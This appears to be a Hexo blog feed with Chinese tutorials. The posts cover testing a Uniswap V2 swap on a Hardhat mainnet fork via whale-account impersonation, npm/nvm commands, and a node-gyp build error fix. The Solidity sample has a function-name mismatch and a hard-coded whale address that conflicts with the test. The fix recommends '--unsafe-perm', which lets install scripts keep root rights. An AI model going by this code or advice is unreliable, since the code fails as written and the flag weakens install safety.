    <content type="html"><![CDATA[<blockquote><p>访问  <a href="https://app.uniswap.org/">UniSwap</a></p><p>本章我们教大家如何解锁ETH主网上的巨鲸地址，并用该地址发起交易</p></blockquote><h2 id="1-编写合约接口"><a href="#1-编写合约接口" class="headerlink" title="1.编写合约接口"></a>1.编写合约接口</h2><p>在&#x2F;interfaces文件夹下创建<code>IERC20.sol和Uniswap.sol</code>文件</p><p><code>IERC20.sol</code>(官方标准接口，建议保存)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: UNLICENSED<br>pragma solidity &gt;=0.5.0;<br><br>interface IERC20 &#123;<br>    event Approval(address indexed owner, address indexed spender, uint value);<br>    event Transfer(address indexed from, address indexed to, uint value);<br><br>    function name() external view returns (string memory);<br>    function symbol() external view returns (string memory);<br>    function decimals() external view returns (uint8);<br>    function totalSupply() external view returns (uint);<br>    function balanceOf(address owner) external view returns (uint);<br>    function allowance(address owner, address spender) external view returns (uint);<br><br>    function approve(address spender, uint value) external returns (bool);<br>    function transfer(address to, uint value) external returns (bool);<br>    function transferFrom(address from, address to, uint value) external returns (bool);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Uniswap.sol</code>（自写接口文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: UNLICENSED<br>pragma solidity 0.8.0;<br><br>interface IUniswapV2Router &#123;<br>    function swapExactTokenForTokens(<br>        uint256 amountIn,<br>        uint256 amountOutMin,<br>        address[] calldata path,<br>        address to,<br>        uint256 deadline<br>    ) external returns (uint256[] memory amounts);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-接口函数swapExactTokenForTokens参数详解"><a href="#2-接口函数swapExactTokenForTokens参数详解" class="headerlink" title="2.接口函数swapExactTokenForTokens参数详解"></a>2.接口函数<code>swapExactTokenForTokens</code>参数详解</h2><blockquote><p>这是一个用已知数量的代币去交换未知数量代币的接口函数</p><p>举个例子：用100usdt的代币去交换btc，100是已知的，但能够交换到多少btc是未知的</p></blockquote><ol><li><code>amountIn</code> 用于交换的代币的数量，就是上例中的100；</li><li><code>amountOutMin</code> 即用户所期望的滑点；</li><li><code>path</code> 交易路径，用于确认交换代币的种类，上例中用usdt交换btc，那么交易路径就是[‘usdt合约地址’,’btc合约地址’]；</li><li><code>to</code>  自己的钱包地址</li><li><code>deadline</code> 常说的ddl，如果这次交易到ddl还没有打包成功，那么该次交易将会撤回</li></ol><h2 id="3-编写测试合约"><a href="#3-编写测试合约" class="headerlink" title="3.编写测试合约"></a>3.编写测试合约</h2><p><code>TestUniswap.sol</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8;<br><br>//导入接口<br>import &quot;./interfaces/IERC20.sol&quot;;<br>import &quot;./interfaces/Uniswap.sol&quot;;<br><br>//在本合约中我们模拟巨鲸账户在主网发起交易<br>//本实例中，使用WBTC交换DAI币<br>contract TestUniswap &#123;<br>    //定义UniSwap路由<br>    address private constant UNISWAP_V2_ROUTER =<br>        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;<br>    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;<br>    //定义巨鲸账户地址<br>    address private constant WBTC_WHALE =<br>        0x2FAF487A4414Fe77e2327F0bf4AE2a264a776AD2;<br>    //交换函数<br>    function swap(<br>        address _tokenIn,<br>        address _tokenOut,<br>        uint256 _amountIn,<br>        uint256 _amountOutMin,<br>        address _to<br>    ) external &#123;<br>        //模拟巨鲸账户地址触发该币种交易<br>        IERC20(_tokenIn).transferFrom(WBTC_WHALE, address(this), _amountIn);<br>        //向uniswap路由授权该币种<br>        IERC20(_tokenIn).approve(UNISWAP_V2_ROUTER, _amountIn);<br><br>        address[] memory path;<br>        //判断<br>        //在uniswap中，WETH作为所有币种交换的中间币<br>        //因此在这里需要判断是否是WETH作为交换币种<br>        if (_tokenIn == WETH || _tokenOut == WETH) &#123;<br>            path = new address[](2);<br>            path[0] = _tokenIn;<br>            path[1] = _tokenOut;<br>        &#125; else &#123;<br>            path = new address[](3);<br>            path[0] = _tokenIn;<br>            path[1] = WETH;<br>            path[2] = _tokenOut;<br>        &#125;<br><br>  //调用接口函数      <br>IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(<br>            _amountIn,<br>            _amountOutMin,<br>            path,<br>            _to,<br>            block.timestamp<br>        );<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译合约</p><h2 id="4-测试项目"><a href="#4-测试项目" class="headerlink" title="4.测试项目"></a>4.测试项目</h2><blockquote><p>在本教程中，我们选在hardhat的waffle写法来实现测试</p><p>使用ganache-cli来模拟网络环境</p></blockquote><p><strong>须知：</strong></p><ul><li>hardhat与ether.js&amp;&amp;waffle是原生搭配</li><li>truffle 与web3.js&amp;&amp;mocha是原生搭配</li><li>waffle和mocha都是独特的接口写法类型</li><li>他们分别基于ether.js和web3.js实现</li></ul><h3 id="test-testUniswap-js"><a href="#test-testUniswap-js" class="headerlink" title="test/testUniswap.js"></a><code>test/testUniswap.js</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123;<br>    ethers<br>  &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hardhat&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> hre = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hardhat&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> &#123;<br>    <span class="hljs-variable constant_">WETH</span>,<br>    <span class="hljs-variable constant_">DAI</span>,<br>    <span class="hljs-variable constant_">WETH_WHALE</span><br>  &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./config&quot;</span>);<br>  <br><br>  <span class="hljs-keyword">const</span> &#123; pow &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./util&#x27;</span>);<br>  <br>  <span class="hljs-comment">//模块测试</span><br>  <span class="hljs-title function_">describe</span>(<span class="hljs-string">&quot;TestUniswap&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br><br>    <span class="hljs-comment">//定义用于交换的代币数量</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AMOUNT_IN</span> = <span class="hljs-number">100000</span>;<br>    <span class="hljs-comment">//最小</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AMOUNT_OUT_MIN</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//以太坊</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOKEN_IN</span> = <span class="hljs-variable constant_">WETH</span>;<br>    <span class="hljs-comment">//dai币</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOKEN_OUT</span> = <span class="hljs-variable constant_">DAI</span>;<br>  <br>  <br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">TestUniswap</span>;<br>    <span class="hljs-keyword">let</span> testUniswap;<br>    <span class="hljs-keyword">let</span> tokenIn;<br>    <span class="hljs-keyword">let</span> tokenOut;<br>    <span class="hljs-keyword">let</span> whale;<br>  <br>  <br>    <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <br>      <span class="hljs-comment">//解锁巨鲸账户</span><br>      <span class="hljs-keyword">await</span> hre.<span class="hljs-property">network</span>.<span class="hljs-property">provider</span>.<span class="hljs-title function_">request</span>(&#123;<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;hardhat_impersonateAccount&quot;</span>,<br>        <span class="hljs-attr">params</span>: [<span class="hljs-variable constant_">WETH_WHALE</span>],<br>      &#125;)<br>  <br>      <span class="hljs-comment">//实例化巨鲸账户</span><br>      whale = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigner</span>(<span class="hljs-variable constant_">WETH_WHALE</span>);<br>  <br>      <span class="hljs-comment">//whale.address</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;the whale address is: &#x27;</span>, whale.<span class="hljs-property">address</span>)<br>      <br>      <span class="hljs-comment">//实例化tokenin，实例化tokenout</span><br>      tokenIn = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&quot;IERC20&quot;</span>, <span class="hljs-variable constant_">TOKEN_IN</span>);<br>      tokenOut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&quot;IERC20&quot;</span>, <span class="hljs-variable constant_">TOKEN_OUT</span>);<br><br>      <span class="hljs-comment">//实例化刚写的测试合约</span><br>      <span class="hljs-title class_">TestUniswap</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&#x27;TestUniswap&#x27;</span>);<br>      testUniswap = <span class="hljs-keyword">await</span> <span class="hljs-title class_">TestUniswap</span>.<span class="hljs-title function_">deploy</span>();<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;tokenIn address is:&#x27;</span>, tokenIn.<span class="hljs-property">address</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;tokenOut address is:&#x27;</span>, tokenOut.<span class="hljs-property">address</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;testUniswap address is:&#x27;</span>, testUniswap.<span class="hljs-property">address</span>);<br>   <br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;the whale WETH balance is:&quot;</span>, <span class="hljs-keyword">await</span> tokenIn.<span class="hljs-title function_">balanceOf</span>(whale.<span class="hljs-property">address</span>))<br>  <br>      <span class="hljs-keyword">await</span> tokenIn.<span class="hljs-title function_">connect</span>(whale).<span class="hljs-title function_">approve</span>(testUniswap.<span class="hljs-property">address</span>,<span class="hljs-variable constant_">AMOUNT_IN</span>);<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;approve token success!&#x27;</span>)<br>  <br>    &#125;);<br>  <br>  <br>  <br>    <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;should swap&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;the whale dai balance is : &#x27;</span>, <span class="hljs-keyword">await</span> tokenOut.<span class="hljs-title function_">balanceOf</span>(whale.<span class="hljs-property">address</span>));<br>  <br>  <br>      <span class="hljs-keyword">await</span> testUniswap.<span class="hljs-title function_">connect</span>(whale).<span class="hljs-title function_">swap</span>(<br>        tokenIn.<span class="hljs-property">address</span>,<br>        tokenOut.<span class="hljs-property">address</span>,<br>        <span class="hljs-variable constant_">AMOUNT_IN</span>,<br>        <span class="hljs-variable constant_">AMOUNT_OUT_MIN</span>,<br>        whale.<span class="hljs-property">address</span>, <br>        &#123;<br>          <span class="hljs-attr">gasPrice</span>: <span class="hljs-number">10000000000</span>,<br>          <span class="hljs-attr">gasLimit</span>: <span class="hljs-number">2000000</span><br>        &#125;<br>  <br>      )<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`swap tokenin is <span class="hljs-subst">$&#123;AMOUNT_IN&#125;</span>`</span>);<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;after swap the whale dai balance is : &#x27;</span>, <span class="hljs-keyword">await</span> tokenOut.<span class="hljs-title function_">balanceOf</span>(whale.<span class="hljs-property">address</span>));<br>  <br>      <br>    &#125;);<br>  &#125;);<br></code></pre></td></tr></table></figure><h3 id="别忘了配置hardhat-config-js"><a href="#别忘了配置hardhat-config-js" class="headerlink" title="别忘了配置hardhat.config.js"></a>别忘了配置<code>hardhat.config.js</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">require(&quot;@nomiclabs/hardhat-waffle&quot;);<br><br><br><br>const MAINNET_URL = &quot;https://eth-mainnet.g.alchemy.com/v2/自己的apikey&quot;;<br><br>module.exports = &#123;<br>  solidity: &quot;0.8.0&quot;,<br>  networks: &#123;<br>    hardhat: &#123;<br>      forking: &#123;<br>        url: MAINNET_URL<br>      &#125;<br>      <br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><ol><li>开启本地节点监听</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx hardhat node <br></code></pre></td></tr></table></figure><ol start="2"><li>开始测试（需要指定在当前网络之下测试）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx hardhat test --network localhost<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>DeFi</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Uniswap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建专属于你的DEX(part.1)</title>
    <link href="/2022/10/22/%E6%90%AD%E5%BB%BA%E4%B8%93%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84DEX-part1/"/>
    <url>/2022/10/22/%E6%90%AD%E5%BB%BA%E4%B8%93%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84DEX-part1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>npm&amp;nvm基本操作</title>
    <link href="/2022/10/12/npm&amp;nvm%E5%BF%85%E5%A4%87%E6%93%8D%E4%BD%9C/"/>
    <url>/2022/10/12/npm&amp;nvm%E5%BF%85%E5%A4%87%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><h3 id="1-镜像"><a href="#1-镜像" class="headerlink" title="1. 镜像"></a>1. 镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 查看当前的镜像源</span><br>npm config get registry<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 修改镜像路径（淘宝）</span><br>npm config set registry https://registry.npm.taobao.org<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 安装镜像管理器nrm</span><br>npm i nrm -g<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">4. 查看当前环境中所有的镜像</span><br>nrm ls<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">5. nrm快速切换淘宝镜像</span><br>nrm use taobao<br><br></code></pre></td></tr></table></figure><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 全局安装</span><br>npm i module -g<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 安装到开发环境</span><br>npm i --save-dev module<br><span class="hljs-meta prompt_"># </span><span class="language-bash">等同于</span><br>npm i -D module<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 安装到生产环境</span><br>npm i --save module<br><span class="hljs-meta prompt_"># </span><span class="language-bash">等同于</span><br>npm i -S module<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">4. 同时安装多个模块，模块之间要有空格</span><br>npm i module1 module2 module3...<br></code></pre></td></tr></table></figure><h2 id="nvm-以管理员身份运行cmd"><a href="#nvm-以管理员身份运行cmd" class="headerlink" title="nvm(以管理员身份运行cmd)"></a>nvm(以管理员身份运行cmd)</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>到 github 上面下载。下载地址：<a href="https://links.jianshu.com/go?to=https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a></p><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看nvm安装node的目录</span><br>nvm root<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前已经安装的node版本</span><br>nvm list<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前可用的node版本</span><br>nvm list avaliable<br><span class="hljs-meta prompt_"># </span><span class="language-bash">取消选中的node版本</span><br>nvm off<br><span class="hljs-meta prompt_"># </span><span class="language-bash">选用node版本</span><br>nvm use XX.XX.XX<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装node新版本</span><br>nvm install XX.XX.XX<br><span class="hljs-meta prompt_"># </span><span class="language-bash">卸载node版本</span><br>nvm uninstall XX.XX.XX<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试</span><br>nvm -v<br>npm -v<br><span class="hljs-meta prompt_">#</span><span class="language-bash">qi</span><br>npm cache clean --force<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>基操勿6</category>
      
      <category>包管理器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>npm</tag>
      
      <tag>nvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gyp ERR(not found visual studio 20xx v)解决</title>
    <link href="/2022/10/04/gyp%20ERR-not%20found%20visual%20studio%2020xx%20%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/10/04/gyp%20ERR-not%20found%20visual%20studio%2020xx%20%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>最近项目安装蚂蚁链依赖包的时候，运行 npm i，出现如下错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">gyp ERR! find VS <br>gyp ERR! find VS msvs_version was set from command line or npm config<br>gyp ERR! find VS - looking for Visual Studio version 2015<br>gyp ERR! find VS VCINSTALLDIR not set, not running in VS Command Prompt<br>gyp ERR! find VS unknown version &quot;undefined&quot; found at &quot;C:\Program Files\Microsoft Visual Studio\2022\Community&quot;<br>gyp ERR! find VS could not find a version of Visual Studio 2017 or newer to use<br>gyp ERR! find VS looking for Visual Studio 2015<br>gyp ERR! find VS - not found<br>gyp ERR! find VS not looking for VS2013 as it is only supported up to Node.js 8<br>gyp ERR! find VS <br>gyp ERR! find VS valid versions for msvs_version:<br>gyp ERR! find VS<br>gyp ERR! find VS **************************************************************<br>gyp ERR! find VS You need to install the latest version of Visual Studio<br>gyp ERR! find VS including the &quot;Desktop development with C++&quot; workload.<br>gyp ERR! find VS For more information consult the documentation at:<br>gyp ERR! find VS https://github.com/nodejs/node-gyp#on-windows<br>gyp ERR! find VS **************************************************************<br>gyp ERR! find VS<br>gyp ERR! configure error<br>gyp ERR! stack Error: Could not find any Visual Studio installation to use<br>gyp ERR! stack     at VisualStudioFinder.fail (E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:121:47)<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:74:16<br>gyp ERR! stack     at VisualStudioFinder.findVisualStudio2013 (E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:351:14)       <br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:70:14<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:372:16<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\util.js:54:7<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\util.js:33:16<br>gyp ERR! stack     at ChildProcess.exithandler (child_process.js:397:5)<br>gyp ERR! stack     at ChildProcess.emit (events.js:400:28)<br>gyp ERR! stack     at maybeClose (internal/child_process.js:1055:16)<br>gyp ERR! System Windows_NT 10.0.22000<br>gyp ERR! command &quot;C:\\Program Files\\nodejs\\node.exe&quot; &quot;E:\\Enviroment\\nvm\\v14.17.6\\node_modules\\npm\\node_modules\\node-gyp\\bin\\node-gyp.js&quot; &quot;rebuild&quot;<br>gyp ERR! cwd E:\AntPrograms\antchain-fronted\node_modules\secp256k1<br>gyp ERR! node -v v14.17.6<br>gyp ERR! node-gyp -v v5.1.0<br>gyp ERR! not ok<br>npm ERR! code ELIFECYCLE<br>npm ERR! errno 1<br>npm ERR! secp256k1@3.8.0 rebuild: `node-gyp rebuild`<br>npm ERR! Exit status 1<br>npm ERR!<br>npm ERR! Failed at the secp256k1@3.8.0 rebuild script.<br>npm ERR! This is probably not a problem with npm. There is likely additional logging output above.<br>npm WARN Local package.json exists, but node_modules missing, did you mean to install?<br><br>npm ERR! A complete log of this run can be found in:<br></code></pre></td></tr></table></figure><p><strong>解决办法是:安装 –unsafe-perm</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install --unsafe-perm  // Windows不需要加sudo<br>或<br>yarn --unsafe-perm  // Windows不需要加sudo<br><br>// 如果还是报错，这时候你需要删除node_module和 .lock文件，重新安装<br></code></pre></td></tr></table></figure><p><strong>看一个猿友这样解释说：</strong></p><blockquote><p>npm 出于安全考虑不支持以 root 用户运行，即使你用 root 用户身份运行了，npm 会自动转成一个叫 nobody 的用户来运行，而这个用户几乎没有任何权限。这样的话如果你脚本里有一些需要权限的操作，比如写文件（尤其是写 &#x2F;root&#x2F;.node-gyp），就会崩掉了。<br>为了避免这种情况，要么按照 npm 的规矩来，专门建一个用于运行 npm 的高权限用户；要么加 –unsafe-perm 参数，这样就不会切换到 nobody 上，运行时是哪个用户就是哪个用户，即使是 root。</p></blockquote><p><strong>然后运行：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i --unsafe-perm<br></code></pre></td></tr></table></figure><p>安装异常就成功解决啦！</p>]]></content>
    
    
    <categories>
      
      <category>包管理器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>npm</tag>
      
      <tag>安装异常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
